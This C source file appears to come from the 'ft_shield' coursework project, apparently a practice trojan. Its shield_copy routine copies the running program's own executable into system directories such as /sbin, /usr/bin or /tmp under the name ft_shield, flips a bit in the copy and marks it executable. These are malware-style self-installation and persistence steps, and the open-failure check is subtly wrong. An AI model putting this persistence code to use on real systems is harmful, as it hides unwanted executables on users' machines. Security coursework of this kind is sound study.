/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   copy.cc                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/23 02:22:51 by kiroussa          #+#    #+#             */
/*   Updated: 2025/11/29 01:51:38 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#if !MATT_MODE

#include <fcntl.h>
#include <linux/limits.h>
#include <shield.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define TARGET_FILE_NAME "ft_shield"
#define BUFFER_SIZE 65536

static inline bool	shield_directory_exists(const char *dir, int depth)
{
	struct stat	s;

	if (depth > 10)
		return (false);
	DEBUG("Checking if %s exists\n", dir);
	if (stat(dir, &s) < 0)
	{
		DEBUG("stat failed: %m\n");
		return (false);
	}
	if (S_ISDIR(s.st_mode))
	{
		DEBUG("S_ISDIR, yippie\n");
		return (true);
	}
	if (S_ISLNK(s.st_mode))
	{
		char	buf[PATH_MAX + 1];

		memset(buf, 0, sizeof(buf));
		DEBUG("S_ISLNK, recursing\n");
		if (readlink(dir, buf, PATH_MAX) < 0)
			return (false);
		DEBUG("readlink: %s\n", buf);
		return (shield_directory_exists(buf, depth + 1));
	}
	DEBUG("Not a directory, not a symlink, nay\n");
	return (false);
}

static inline int	shield_find_target(char **binary_path)
{
#define TARGET(name, flags, mode) do { \
	DEBUG("Copying to " name "\n"); \
	*binary_path = (char *) name; \
	return (open(name, flags, mode)); \
} while (0)

#if SHIELD_DEBUG
	if (!getenv("SHIELD_NO_DAEMON_COPY"))
		TARGET("daemon_" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
#endif // SHIELD_DEBUG
	if (shield_directory_exists("/sbin", 0))
		TARGET("/sbin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/usr/sbin", 0))
		TARGET("/usr/sbin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/bin", 0))
		TARGET("/bin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/usr/bin", 0))
		TARGET("/usr/bin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/usr/local/bin", 0))
		TARGET("/usr/local/bin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/usr/local/sbin", 0))
		TARGET("/usr/local/sbin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/opt/bin", 0))
		TARGET("/opt/bin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/tmp", 0))
		TARGET("/tmp/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/var/tmp", 0))
		TARGET("/var/tmp/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/dev/shm", 0))
		TARGET("/dev/shm/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	if (shield_directory_exists("/run", 0))
		TARGET("/run/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644);
	return (-1);
#undef TARGET
}

static inline void	cleanup_fd(const int fd)
{
	if (fd >= 0)
		close(fd);
}

static inline bool	shield_copy_file(int from, int to)
{
	char	buf[BUFFER_SIZE];
	ssize_t	nread;
	ssize_t	nwritten;

	while (true)
	{
		nread = read(from, buf, sizeof(buf));
		if (nread < 0)
			return (true);
		if (nread == 0)
			break ;
		nwritten = write(to, buf, nread);
		if (nwritten != nread)
			return (true);
	}
	DEBUG("copy success\n");
	return (false);
}

int	shield_copy(char **binary_path)
{
	const int	orig = open("/proc/self/exe", O_RDONLY);
	const int	bin = shield_find_target(binary_path);
	bool		err;

	err = true;
	if (orig && bin)
	{
		err = shield_copy_file(orig, bin);
		if (!err)
			err = shield_flip_bit(bin);
		if (!err)
			err = (fchmod(bin, 0755) < 0);
	}
	cleanup_fd(orig);
	cleanup_fd(bin);
	return (!err);
}

#endif // !MATT_MODE
